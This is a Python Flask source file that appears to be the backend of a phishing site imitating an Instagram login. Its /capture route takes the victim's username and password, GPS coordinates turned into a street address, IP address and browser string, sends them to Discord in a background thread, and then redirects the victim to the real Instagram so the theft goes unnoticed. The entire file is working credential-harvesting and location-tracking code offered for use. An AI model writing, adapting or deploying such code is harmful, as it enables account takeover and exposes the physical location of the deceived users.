from flask import Flask, render_template, request, redirect
from discord_notify import send_to_discord
from geocode import reverse_geocode
from config import REAL_INSTAGRAM
import threading

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/capture", methods=["POST"])
def capture():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    lat = request.form.get("lat", "")
    lng = request.form.get("lng", "")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")

    address = ""
    try:
        if lat and lng:
            address = reverse_geocode(float(lat), float(lng))
    except Exception as e:
        print(f"[reverse] error: {e}")

    threading.Thread(
        target=send_to_discord,
        args=(username, password, address, lat, lng, ip, ua),
        daemon=True,
    ).start()

    return redirect(REAL_INSTAGRAM, code=302)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
